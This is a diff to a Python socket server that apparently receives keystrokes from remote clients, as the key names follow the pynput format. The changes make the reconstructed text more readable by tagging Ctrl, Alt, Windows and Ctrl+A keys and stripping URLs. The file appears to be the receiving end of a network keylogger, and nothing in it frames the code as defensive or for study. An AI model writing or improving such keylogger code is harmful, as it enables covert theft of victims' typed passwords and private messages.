@@ -1,4 +1,5 @@
 import datetime
+import re
 import socket
 import os
 import time
@@ -40,6 +41,8 @@ def handle_client(client_socket,client_address):
                 data = data.decode('utf-8')
                 data = data.replace("'b'", "")
                 data = data.replace("'", "")
+                data = re.sub(r"https://\S+", "", data)
+
 
                 if data == "Key.backspace":
                     data = "back"
@@ -49,18 +52,24 @@ def handle_client(client_socket,client_address):
                     if data == "Key.shift":
                         data = ""
                     if data == "Key.ctrl_l":
-                        data = ""
+                        data = "[Ctrl]"
                     if data == "Key.alt_l":
-                        data = ""
+                        data = "[Alt]"
                     if data == "Key.tab":
                         data = "\t"
                     if data == "Key.enter":
                         data = "\n"
                     if data == "Key.space":
                         data = "_"
+                    if data == "Key.caps_lock":
+                        data = ""
+                    if data == "Key.cmd":
+                        data = "[Wind]"
                     else:
                         data = data.replace("Key.", "")
-
+                    if data == "\x01":
+                        data = "[CtrA]"
+                    
                 data_received += data
                 print(data, end="")
 
